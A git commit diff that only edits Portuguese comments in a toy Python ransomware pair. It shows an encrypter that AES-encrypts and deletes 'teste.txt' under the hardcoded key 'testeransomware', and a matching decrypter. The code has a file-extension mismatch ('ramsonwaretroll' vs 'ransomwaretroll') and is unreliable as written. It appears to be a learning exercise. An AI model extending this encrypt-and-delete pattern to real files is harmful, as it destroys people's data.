8cb860ccf144fd794cd5cf048d8efb0e3d68836f
Malcav <110610828+Malcav@users.noreply.github.com>
2025-01-09 14:43:52 -0300

    Add files via upload

--- decrypter.py
+++ decrypter.py
@@ -1,14 +1,14 @@
 import os
 import pyaes
 
-## abrir aquivo cripto
+## abrir aquivo criptografado
 
 file_name = 'teste.txt.ransomwaretroll'
 file = open(file_name, 'rb')
 file_data = file.read()
 file.close()
 
-## chave de decripto
+## chave descriptografica
 
 key = b"testeransomware"
 aes = pyaes.AESModeOfOperationCTR(key)
@@ -17,7 +17,7 @@ decrypt_data = aes.decrypt(file_data)
 ## remove arquivo cripto
 os.remove(file_name)
 
-##cria um novo descripto
+##cria um novo arquivo descriptografado
 
 new_file = 'teste.txt'
 new_file = open(f'{new_file}','wb')
--- encrypter.py
+++ encrypter.py
@@ -1,7 +1,7 @@
 import os
 import pyaes
 
-## abrir aquivo cripto
+## abrir aquivo original
 
 file_name = 'teste.txt'
 file = open(file_name, 'rb')
@@ -12,13 +12,13 @@ file.close()
 
 os.remove(file_name)
 
-## chave de cripto
+## chave descriptografica
 
 key = b"testeransomware"
 aes = pyaes.AESModeOfOperationCTR(key)
 encrypt_data = aes.encrypt(file_data)
 
-## cria novo arquivo encriptografado
+## cria novo arquivo criptografado
 
 new_file = file_name + '.ramsonwaretroll'
 new_file = open(f'{new_file}','wb')
